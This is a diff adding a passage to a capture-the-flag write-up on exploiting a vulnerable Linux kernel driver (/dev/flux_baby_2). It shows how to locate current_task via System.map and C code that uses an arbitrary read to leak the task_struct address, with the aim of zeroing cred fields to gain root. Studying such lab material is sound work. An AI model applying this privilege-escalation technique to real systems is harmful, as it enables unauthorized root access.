@@ -756,7 +756,54 @@ fail:
 
 Now the question is. What can we do having arbitrary read and write? We still do not control $rip, but do we have to? No. As you can read in [here](https://github.com/kscieslinski/CTF/tree/master/notes/permissions#kernel-structures--capabilities) kernel allocated struct task_struct for each process. This structure keeps most relevant informations about a process. One of the informations is a pointer to `cred` structure. In the `cred` structure we have field such as: `uid`, `guid`, `suid`, `sgid` etc. We all know that root has all those fields set to 0, and our unprivilaged user has them set to 1000. So what we can actually do is to set them to 0. All we need to get is an address of those fields!
 
+You can imagine that kernel developers quite often need to access informations about a current process. And so there is a great global variable:
 
+`struct task_struct *current_task;`
+
+which points to a task_struct of a current process. As there is no KASLR enabled and we are provided System.map we can find an address of it:
+
+```console
+$ egrep "current_task" System.map
+ffffffff816d4df0 r __ksymtab_current_task
+ffffffff816db115 r __kstrtab_current_task
+ffffffff8183a040 D current_task
+```
+
+Cool! But this is just an address of a pointer. What we need is an address of a structure. But we can use our arbitrary read vulnerability to read it. Let's start writing our escalate function:
+
+```c
+/* Escalate process privilages by overwriting current_task->cred->uid */
+int escalate() {
+    int err;
+    u_int64_t current;
+    u_int64_t current_creds;
+
+    err = driver_read(&current, CURRENT_TASK_ADDR);
+    if (err < 0) {
+        perror("[-] leak address of current\n");
+        goto fail;
+    }
+    printf("[+] Leaked address of current: %p\n", current);
+
+    return 0;
+fail:
+    return -1;
+}
+
+int main() {
+    [...]
+    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);
+
+    err = escalate();
+    if (err < 0) {
+        perror("[-] Failed to escalate privilages\n");
+        goto fail;
+    }
+
+    close(fd);
+    [...]
+}
+```
 
 
 ## References
